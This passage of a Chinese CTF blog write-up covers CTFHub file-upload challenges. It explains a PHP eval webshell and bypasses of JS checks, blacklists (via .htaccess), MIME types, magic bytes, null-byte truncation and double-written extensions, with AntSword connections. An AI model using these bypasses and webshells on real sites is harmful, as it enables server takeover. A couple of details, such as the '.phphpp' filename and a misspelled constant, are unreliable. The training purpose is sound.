<li> ‘ <em>@</em> ‘ 代表后面的操作即使运行错误也不报错, 不然报错了立刻被发现还能叫什么木马?</li>
<li>‘ <em>eval</em>() ‘ 函数中括号内的字符串全部当作代码执行</li>
<li>‘ <em>$__POST[‘shell’]</em> ‘ 以post方法获取变量 ‘ shell’ ‘ 的值</li>
</ul>
<p>​    上传完之后如图 :<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170228434.png" alt="image-20211102170228434">  连路径都给好了, 属实是良心题了</p>
<p>​    然后连接中国蚁剑, 测试连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170440802.png" alt="image-20211102170440802"></p>
<p>​    连接成功, 点进去在 <em>html</em> 文件夹下就能找到 flag 了</p>
<hr>
<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><p>​    打开后看到 <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102171054972.png" alt="image-20211102171054972"></p>
<p>​    查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkfilesuffix()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkfilesuffix</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> file=<span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;请添加上传文件&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file_suffix=file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(whitelist.indexOf(file_suffix) == -<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;该文件不允许上传&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    发现只允许上传 <em>.jpg</em> <em>.gif</em> 和 <em>.png</em> 文件, 但是验证只存在于前端, 在网安中有这么一句话, <em><strong>位于客户端的数据输入校验都是可以绕过的</strong></em> . 有两种方法可以绕过 <em>JS</em> 验证</p>
<ol>
<li> 禁用 JS</li>
</ol>
<p>   在设置中禁用Javascript后, 刷新界面,便能够上传了</p>
<ol start="2">
<li> 将 <em>get.php</em> 的后缀名改为其中的任意一个后上传, 同时使用 Burp 抓包, 看到如下页面</li>
</ol>
<p>   <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102174146329.png" alt="image-20211102174146329"> </p>
<p>   将 <strong>第18行</strong> 的 <em>filename=”get.<strong>jpg</strong>“</em> 改为 <em>filename=”get.<strong>php</strong>“</em> , 然后发送, 便能成功上传了</p>
<p>   上传成功后连蚁剑就完事了</p>
<hr>
<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><blockquote>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能                                                                         – From 题目</p>
</blockquote>
<p>​    还没开, 先看看提示, 发现有一个改变文件扩展名, 是否能从这里下手呢? </p>
<p>​    多的不说, 先看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - htaccess<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - htaccess<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $ext = pathinfo($name)[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span></span><br><span class="line"><span class="comment">    if (!in_array($ext, $blacklist)) &#123;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>



<p>​    看到有一个黑名单, 头铁继续传 <em>get.php</em> 试试, 发现提示 <em>“文件类型不匹配”</em> ,必须想别的方法</p>
<p>​    搜了下发现一个好玩的, <a href="https://blog.csdn.net/shana_8/article/details/104827642">.htaccess 文件上传漏洞</a> ,概括一下就是可以自己写一个 <em>.htaccess</em> 文件来自定义解析规则</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">get</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其作用为: 当上传的文件的名字中有 <strong>“ get “</strong> 时,将该文件以php来解析, 那么思路就是先传一个 <em>.htaccess</em> 文件然后传 <em>get.jpg</em> ,最后连蚁剑, 完事儿收工  <del>吃饭去了回来再写</del></p>
<hr>
<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>​    这回的源码就没啥可看的了, 就不放出来了</p>
<p>​    <strong>MIME是个啥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</span><br><span class="line">是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</span><br></pre></td></tr></table></figure>

<p>​    说人话就是为某种文件设置默认打开程序, 常见的 MIME 类型如下</p>
<ul>
<li>text/plain (纯文本)</li>
<li>text/html ( HTML 文档)</li>
<li>text/javascript ( js 代码)</li>
<li>application/xhtml+xml ( XHTML 文档)</li>
<li>image/gif ( GIF 图像)</li>
<li>image/jpeg ( JPEG 图像)</li>
<li>image/png ( PNG 图像)</li>
<li>video/mpeg ( MPEG 动画)</li>
<li>application/octet-stream (二进制数据)</li>
<li>application/pdf ( PDF 文档)</li>
</ul>
<p><strong>绕过原理</strong>     <del>大黑客来辣</del></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</span><br></pre></td></tr></table></figure>

<p>​    就是 burp 抓抓包然后改改重发就彳亍</p>
<p><em><strong>回到题目来</strong></em></p>
<p>​    先试了试直接传 <em>.php</em> ,意料之中的寄了, 然后随便传了一张流汗黄豆能行, 所以就可以将类型改为 <em>image/jpge</em> 来绕过</p>
<p>​    burp 抓包获得如下信息 </p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102203123593.png" alt="image-20211102203123593"> </p>
<p>​    改变 <strong>第19行</strong> 就能成事儿 ,然后就是连连看了</p>
<hr>
<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>​    源码看不如不看, skip</p>
<p>​    国际惯例, 莽传一手. 情理之中的没有传上去, 提示:</p>
<blockquote>
<p>文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件</p>
</blockquote>
<p>​    试试传完改名, 不得行, 提示文件错误, 再加上题目名字, 应该是要改改名, 去搜了搜发现还挺有意思的</p>
<p>​    首先, 后端代码大概是这样的: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allow_mime</span> = <span class="keyword">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line"><span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_mime</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;File type error!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    这种使用 <strong>getimagesize()</strong> 的检查是通过检测图片的十六进制文件头来判断文件类型的, 思路就是burp抓包之后在hex里面改改, 下面贴一下常见的图片文件头</p>
<blockquote>
<p>gif (GIF89a) : 47 49 46 38 </p>
<p>jpg jpeg : FF D8 FF</p>
<p>png : 89 50 4E 47 </p>
</blockquote>
<p>​    <strong>完整过程</strong>: 先用 <em>010Editor</em> 把 <em>attack.php</em> 的头加点东西, 识别成png格式, 然后再把后缀名改成 <em>.png</em> 上传, burp抓包把后缀改回 <em>.php</em>, 然后蚁剑上</p>
<hr>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><blockquote>
<p>了解一下 PHP 5.2 00截断上传的原理         </p>
<p>​                                                                           —From 题目</p>
</blockquote>
<p>源码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 文件上传 - 00截断&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CTFHub 文件上传 - 00截断&lt;/h1&gt;</span><br><span class="line">    &lt;form action=?road=/var/www/html/upload/ method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $info = pathinfo($name);</span><br><span class="line">    $ext = $info[&#x27;extension&#x27;];</span><br><span class="line">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line">    if (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件类型不匹配&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    注意到注释中的判断语句, 介绍一下其中包含的几个函数</p>
<ol>
<li><p><strong>basename()</strong></p>
<p>用于返回文件名,用法如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">basename(path, suffix)</span><br></pre></td></tr></table></figure>

<p>其中, <em>path</em> 必需, 用于明确文件路径; <em>suffix</em> 为可选, 规定文件拓展名,若所打开的文件的拓展名与其相同, 则不会显示该拓展名. 实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/user/remake.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行该代码, 则会输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">remake.php</span><br><span class="line">remake</span><br></pre></td></tr></table></figure></li>
<li><p><strong>pathinfo()</strong></p>
<p>用于以数组的形式返回关于文件路径的信息, 数组中的返回元素如下:</p>
<ul>
<li>[dirname]: 目录路径</li>
<li>[basename]: 文件名 (完整)</li>
<li>[extension]: 文件后缀名</li>
<li>[filename]: 文件名 (不含后缀)</li>
</ul>
<p>用法为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pathinfo(path,options)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>path</em> 必需, 明确路径; </li>
<li><em>options</em> 可选, 固定要返回的元素, 不填默认 all, 可填: <ul>
<li><em>PATHINFO_DIRNAME</em> (只返回 dirname)  </li>
<li><em>PATHINFO_BASENAME</em> (只返回 basename) </li>
<li><em>PATHINFO_EXTENSION</em> (只返回 extension) </li>
<li>PATHINFO_FILENAME (只返回 filename)</li>
</ul>
</li>
</ul>
<p>实例1:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(pathinfo(<span class="string">&quot;/user/remake.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">	[dirname] =&gt; /user</span><br><span class="line">	[basename] =&gt; remake.php</span><br><span class="line">	[extension] =&gt; php</span><br><span class="line">	[filename] =&gt; remake</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>实例2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(pathinfo(<span class="string">&quot;/user/remake.php&quot;</span>,PATHINFO_BASENAEM));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">remake.php</span><br></pre></td></tr></table></figure></li>
</ol>
<ol start="3">
<li><p><strong>date()</strong></p>
<p>用于格式化日期与时间, 如何格式化详见 <a href="https://www.runoob.com/php/php-date.html">Date()函数</a> </p>
</li>
<li><p><strong>move_uploaded_file()</strong> </p>
<p>将文件移动到指定位置, 执行成功返回 <em>true</em>, 失败返回 <em>false</em> </p>
<p>用法:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file(file, target)</span><br></pre></td></tr></table></figure>

<p>file: 必需, 被移动的文件的文件名; target: 必需, 移动到的路径</p>
<p>回到题目, 看到这句代码:</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . rand(<span class="number">10</span>, <span class="number">99</span>) . date(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure>

<p>​    可以看出是一个通过随机数和时间来达到随机文件名的语句</p>
<p>​    … 没啥思路</p>
<p>​    查一下题目中的提示 </p>
<p><em><strong>00截断上传</strong></em> </p>
<ol>
<li><p><em><strong>原理</strong></em>:</p>
<p><strong>0x00</strong> 是字符串的结束标识, 可以手动添加来截断后面的内容, 而其后面的内容又能帮助绕过检测</p>
</li>
<li><p><em><strong>使用条件</strong></em> :</p>
<p>PHP 版本 &lt; 5.3.29  GPC 关闭</p>
</li>
<li><p><em><strong>利用方法</strong></em> :</p>
<p>上传文件后用 <em>burp</em> 抓包, 在文件名需要截断处加 <em>%00</em> 进行截断</p>
</li>
<li><p><em><strong>urldecode</strong></em> :</p>
<p>进行 <em>urldecode</em> 的原因: 上传路径保存在表单中, 而表单里有一个 <em>enctype</em> 属性, 且 <em>enctype=”multipart/form-data”</em> 使得表单中的数据不被编码,就需要自行提前编码将 <em>%00</em> 转化为结束符; 而若是保存在 <em>url</em> 或者 <em>cookie</em> 中, 在上传时会进行 <em>urldecode</em> 操作,不用自行添加</p>
</li>
</ol>
<p>上传 <em>attack.php.txt</em> , 提示文件类型不匹配</p>
<p>上传 <em>attack.php.jpg</em> , 发现能成功上传</p>
<p>上传 <em>.jpg</em> 并抓包, 获得如下界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211111140634463.png" alt="image-20211111140634463"></p>
<p>(在这个地方传了几次都找不到文件, 后来才发现是第一行的 <em>upload/</em> 后面没有传递文件名, 加进去就行)</p>
<p>修改成这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211111142139561.png" alt="image-20211111142139561"></p>
<p>传完之后打开 <em>/upload/attack.php</em> , 发现显示 <em>phpinfo</em> 页面, 上传成功, 蚁剑带走</p>
<hr>
<h3 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h3><p>(没提示, 那可以开了)</p>
<p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 文件上传——双写绕过&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CTFHub 文件上传——双写绕过&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    函数介绍:</p>
<p>​    <strong>str_ireplace()</strong> :</p>
<p>​    用于替换字符且不区分大小写 (而函数 <em>str_replace()</em> 则是区分大小写的), 用法如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">str_ireplace(find, replace, <span class="keyword">string</span>, count)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>find : 必需, 规定需要查找的值</p>
</li>
<li><p>replace : 必需, 规定被替换成什么</p>
</li>
<li><p>string : 必需, 规定被搜索的字符串</p>
</li>
<li><p>count : 可选, 设定一个变量统计替换的次数</p>
<p>实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;pre&quot;</span>,<span class="string">&quot;make&quot;</span>);</span><br><span class="line">print_r(str_ireplace(<span class="string">&quot;pre&quot;</span>, <span class="string">&quot;re&quot;</span>, <span class="variable">$arr</span>,<span class="variable">$i</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换次数: <span class="subst">$i</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; re [<span class="number">1</span>] =&gt; make ) 替换次数: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>回到题目, 可以看到是被黑名单过滤了, 而 <em>str_ireplace</em> 只会进行一次处理, 即替换完一次之后不会再检查字符串中还有没有能替换的字符, 将后缀名改为 <em>.phphpp</em> 然后上传, 即可看到</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211111153300394.png" alt="image-20211111153300394"></p>
<p>然后蚁剑,收工.</p>
</li>
</ul>
<hr>
